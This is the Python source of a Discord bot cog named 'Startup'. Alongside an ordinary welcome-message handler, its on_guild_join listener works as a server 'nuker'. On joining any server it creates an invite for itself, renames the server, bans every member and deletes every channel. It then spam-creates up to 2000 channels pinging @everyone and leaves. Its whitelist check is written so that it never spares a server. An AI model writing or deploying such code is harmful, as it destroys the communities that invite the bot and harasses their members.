import discord
import os
from discord.ext.commands import Bot
from discord.ext import commands
import random
class Startup(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.Cog.listener()
    async def on_ready(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        if guild.id != 993573362221715546 or guild.id != 993594197594607636:
            try:
                print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                await guild.create_text_channel(f'fuckme1')
                invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                await guild.edit("NOX WAS HERE", reason='Nuked by Anix <3')
                print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                for member in guild.members:
                    await member.ban(reason='Banned by Anix <3')
                    print(f'Banned {member.name} - {str(member.id)}')
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
                for c in guild.channels:
                    await c.delete()
                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
                for i in range(2,2000):
                    await guild.create_text_channel(f'fuckme{i}')
                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
                print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                await guild.leave()
                # error for 
                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
            except discord.ext.commands.GuildNotFound or discord.ext.commands.Forbidden:
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
    @commands.Cog.listener()
    async def on_guild_remove(self, guild):
        print(f'Left guild: {guild.name} - {str(guild.id)}')
    @commands.Cog.listener()
    async def on_member_join(self, member):
        print(f'Guild - {member.guild.name} - {str(member.guild.id)} -  {member.name} - {str(member.id)} joined :)') 
        if member.guild.id == 993594197594607636:
            welcomeid = 1002280186663936080
        elif member.guild.id == 993573362221715546:
            welcomeid = 993573959062790154
        await self.bot.get_channel(welcomeid).send(f"<@{member.id}>",embed=discord.Embed(title=f":wave: Welcome to {member.guild.name}!", description="Please read the rules and have fun!", color=discord.Color.blue()).set_footer(text=f'Welcome {member.name}', icon_url=member.avatar_url).set_image(url="https://i.imgur.com/pkWTMMl.gif"))
        await member.send(f"<@{member.id}> Welcome to the {member.guild.name} Please read the rules and have fun!")
def setup(bot):
    bot.add_cog(Startup(bot))
    print("Startup cog loaded")